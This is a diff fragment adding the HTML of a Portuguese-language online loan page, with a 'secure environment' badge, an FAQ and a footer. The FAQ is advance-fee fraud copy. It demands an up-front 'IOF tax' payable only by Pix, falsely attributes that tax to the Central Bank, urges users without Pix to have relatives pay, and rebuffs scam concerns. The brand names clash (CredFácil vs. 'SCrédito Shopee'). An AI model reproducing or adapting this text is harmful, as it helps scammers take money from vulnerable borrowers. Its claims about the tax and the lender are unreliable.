+                                        <path d="M208 40H48a16 16 0 0 0-16 16v56c0 52.72 25.52 84.67 46.93 102.19c23.06 18.86 46 25.26 47 25.53a8 8 0 0 0 4.2 0c1-.27 23.91-6.67 47-25.53C198.48 196.67 224 164.72 224 112V56a16 16 0 0 0-16-16m0 72c0 37.07-13.66 67.16-40.6 89.42a129.3 129.3 0 0 1-39.4 22.2a128.3 128.3 0 0 1-38.92-21.81C61.82 179.51 48 149.3 48 112V56h160ZM82.34 141.66a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32l-56 56a8 8 0 0 1-11.32 0Z"></path>
+                                    </g>
+                                </svg> Ambiente seguro </span>
+                        </div>
+                        <p></p>
+                        <p></p>
+                        <div class="registration-fee-faq" data-v-d5c2a0e6="" data-v-a343b494=""><span class="card-title" data-v-a343b494="" data-v-303a1430=""><!--[-->Dúvidas frequentes<!--]--></span>
+                            <ul data-v-a343b494="">
+                                <div class="faq-item" data-v-a343b494="" data-v-8c748230="">
+                                    <p class="question" weight="light" data-v-8c748230=""><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--material-symbols-light" data-v-8c748230="" style="" width="1em" height="1em" viewBox="0 0 24 24">
+                                            <path fill="currentColor" d="M12 14.379q-.161 0-.298-.053t-.267-.184L7.046 9.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 13.292l4.246-4.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354l-4.389 4.388q-.13.131-.267.184q-.136.053-.298.053"></path>
+                                        </svg><span data-v-8c748230="">Por que o imposto IOF não é descontado do empréstimo?</span></p>
+                                    <div class="viewBox" data-v-8c748230="">
+                                        <div class="content" data-v-8c748230=""><!--[--> O valor do Imposto IOF é tratado separadamente pois ele é um imposto emitido pelo Banco Central assim que um empréstimo é aprovado, e é destinado aos cofres públicos, para garantir segurança para ambas as partes. <!--]--></div>
+                                    </div>
+                                </div>
+                                <div class="faq-item" data-v-a343b494="" data-v-8c748230="">
+                                    <p class="question" weight="light" data-v-8c748230=""><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--material-symbols-light" data-v-8c748230="" style="" width="1em" height="1em" viewBox="0 0 24 24">
+                                            <path fill="currentColor" d="M12 14.379q-.161 0-.298-.053t-.267-.184L7.046 9.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 13.292l4.246-4.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354l-4.389 4.388q-.13.131-.267.184q-.136.053-.298.053"></path>
+                                        </svg><span data-v-8c748230="">O que acontece após pagar o imposto?</span></p>
+                                    <div class="viewBox" data-v-8c748230="">
+                                        <div class="viewBox" data-v-8c748230=""><!--[--> Você será redirecionado automaticamente para a página onde confirmará e autorizará a transferência do dinheiro para sua conta. <!--]--></div>
+                                    </div>
+                                </div>
+                                <div class="faq-item" data-v-a343b494="" data-v-8c748230="">
+                                    <p class="question" weight="light" data-v-8c748230=""><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--material-symbols-light" data-v-8c748230="" style="" width="1em" height="1em" viewBox="0 0 24 24">
+                                            <path fill="currentColor" d="M12 14.379q-.161 0-.298-.053t-.267-.184L7.046 9.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 13.292l4.246-4.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354l-4.389 4.388q-.13.131-.267.184q-.136.053-.298.053"></path>
+                                        </svg><span data-v-8c748230="">Quanto tempo demora para liberar o crédito?</span></p>
+                                    <div class="viewBox" data-v-8c748230="">
+                                        <div class="viewBox" data-v-8c748230=""><!--[--> Como o pagamento é feito via Pix, a liberação do empréstimo é imediata. Todo o processo, incluindo a transferência do crédito, leva cerca de 5-10 minutos. <!--]--></div>
+                                    </div>
+                                </div>
+                                <div class="faq-item" data-v-a343b494="" data-v-8c748230="">
+                                    <p class="question" weight="light" data-v-8c748230=""><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--material-symbols-light" data-v-8c748230="" style="" width="1em" height="1em" viewBox="0 0 24 24">
+                                            <path fill="currentColor" d="M12 14.379q-.161 0-.298-.053t-.267-.184L7.046 9.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 13.292l4.246-4.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354l-4.389 4.388q-.13.131-.267.184q-.136.053-.298.053"></path>
+                                        </svg><span data-v-8c748230="">Tô com medo de cair em golpe</span></p>
+                                    <div class="viewBox" data-v-8c748230="">
+                                        <div class="viewBox" data-v-8c748230=""><!--[--><b data-v-a343b494="">CredFácil</b> atua há mais de <b data-v-a343b494="">14 anos</b> com empréstimos online, contando com milhares de clientes satisfeitos. Nosso site é seguro e confiável. Não solicitamos sua senha ou dados bancários. Sugerir que somos um golpe é um insulto �&nbsp; nossa reputação e confiança que nossos clientes têm em nós. <!--]--></div>
+                                    </div>
+                                </div>
+                                <div class="faq-item" data-v-a343b494="" data-v-8c748230="">
+                                    <p class="question" weight="light" data-v-8c748230=""><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--material-symbols-light" data-v-8c748230="" style="" width="1em" height="1em" viewBox="0 0 24 24">
+                                            <path fill="currentColor" d="M12 14.379q-.161 0-.298-.053t-.267-.184L7.046 9.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 13.292l4.246-4.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354l-4.389 4.388q-.13.131-.267.184q-.136.053-.298.053"></path>
+                                        </svg><span data-v-8c748230="">Posso pagar o imposto com cartão de crédito?</span></p>
+                                    <div class="viewBox" data-v-8c748230="">
+                                        <div class="viewBox" data-v-8c748230=""><!--[--> Não, o imposto IOF só pode ser paga via Pix. Se você não tem uma conta em um banco que oferece Pix, peça a um amigo ou familiar para fazer o pagamento para você. <!--]--></div>
+                                    </div>
+                                </div>
+                                <div class="faq-item" data-v-a343b494="" data-v-8c748230="">
+                                    <p class="question" weight="light" data-v-8c748230=""><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--material-symbols-light" data-v-8c748230="" style="" width="1em" height="1em" viewBox="0 0 24 24">
+                                            <path fill="currentColor" d="M12 14.379q-.161 0-.298-.053t-.267-.184L7.046 9.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 13.292l4.246-4.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354l-4.389 4.388q-.13.131-.267.184q-.136.053-.298.053"></path>
+                                        </svg><span data-v-8c748230="">O que acontece se eu não pagar o imposto?</span></p>
+                                    <div class="viewBox" data-v-8c748230="">
+                                        <div class="viewBox" data-v-8c748230=""><!--[--> Se você não pagar o imposto, seu pedido de empréstimo será cancelado, mas lembre-se de que o imposto IOF é obrigatório pelo Banco Central, para garantir a segurança e processamento do seu pedido. <!--]--></div>
+                                    </div>
+                                </div>
+                            </ul>
+                        </div><!--]-->
+                    </div>
+            </main>
+        </div><!--]-->
+        <footer class="footer" data-v-77968890="" data-v-63f14862="">
+            <div class="container" data-v-63f14862="" data-v-0041013f=""><!--[-->
+                <p data-v-63f14862="">© 2025 SCrédito Shopee. Todos os direitos reservados.</p>
+                <p data-v-63f14862="">Plataforma segura de empréstimos online</p><!--]-->
+            </div>
+        </footer>
+    </div>
+
+</body>
+
+</html>
